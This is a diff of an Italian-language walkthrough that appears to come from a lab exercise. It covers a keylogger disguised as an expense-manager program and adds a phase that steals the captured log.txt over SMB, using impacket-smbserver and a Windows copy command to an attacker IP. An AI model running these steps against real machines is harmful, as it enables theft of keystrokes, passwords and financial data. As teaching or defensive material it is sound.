@@ -112,7 +112,7 @@ Alessandro scarica e avvia il programma "Gestore_di_spesa.exe". Il programma si 
 
 ```python
 # Definisci la directory e il nome del file di log
-log_directory = r"C:\Users\Alessandro"
+log_directory = r"C:\Windows\Temp"
 log_file_name = "log.txt"
 log_file_path = os.path.join(log_directory, log_file_name)
 # Funzione per loggare le chiavi premute
@@ -144,11 +144,33 @@ Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informaz
 + Dati personali e finanziari inseriti nei siti web.
 + Comunicazioni via email e chat.
 
-## Fase 3: Esfiltrazione delle file log.txt
+## Fase 3: Estrazione Dati tramite SMB
 
+### Metodologia
+Dopo aver iniettato un keylogger nel sistema di Alessandro e aver raccolto i dati sensibili, l'attaccante sfrutta il protocollo SMB per estrarre il file log.txt contenente le sequenze di tasti catturate.
 
+### 1. Configurazione del Server SMB sull'Attaccante
+L'attaccante configura un server SMB utilizzando lo strumento impacket-smbserver per creare una condivisione di rete che può essere acceduta dal dispositivo della vittima. Il comando seguente avvia il server SMB sul dispositivo dell'attaccante:
 
-## Fase 5: 
+```shell
+impacket-smbserver hax $(pwd) -smb2support
+```
+Questo comando crea una condivisione SMB denominata hax nella directory corrente dell'attaccante.
+
+### 2. Navigazione sulla Macchina della Vittima 
+
+Sulla macchina della vittima (il dispositivo di Alessandro), l'attaccante verifica la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
+
+### 3. Copia del File log.txt tramite SMB
+
+L'attaccante utilizza il comando copy di Windows per copiare il file log.txt dalla macchina della vittima alla condivisione SMB sul dispositivo dell'attaccante. Ecco il comando eseguito sulla macchina della vittima:
+
+```cmd
+copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
+```
+
+Dove 10.0.2.15 è l'indirizzo IP del dispositivo dell'attaccante.
+
 
 ## Fase 7: Conclusioni
 
